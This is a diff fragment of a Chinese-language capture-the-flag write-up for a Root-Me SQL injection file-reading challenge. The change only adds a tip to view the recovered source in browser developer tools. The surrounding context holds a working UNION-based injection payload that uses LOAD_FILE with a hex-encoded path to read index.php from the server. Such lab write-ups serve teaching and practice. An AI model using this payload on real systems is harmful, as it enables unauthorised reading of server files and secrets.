@@ -455,7 +455,7 @@ echo stringxor($key, base64_decode("VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJW
 -8544 UNION ALL SELECT NULL,LOAD_FILE(0x2f6368616c6c656e67652f7765622d736572766575722f636833312f696e6465782e706870),NULL,NULL--
 ```
 
-执行这个 payload ，成功得到 `index.php` 页面的文件源码：
+执行这个 payload ，成功得到 `index.php` 页面的文件源码（注意要在浏览器的开发者工具里面看）：
 
 ![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/rootme/Web-Server/%5B49%5D%20%5B40P%5D%20SQL%20injection%20-%20file%20reading/imgs/17.png)
 
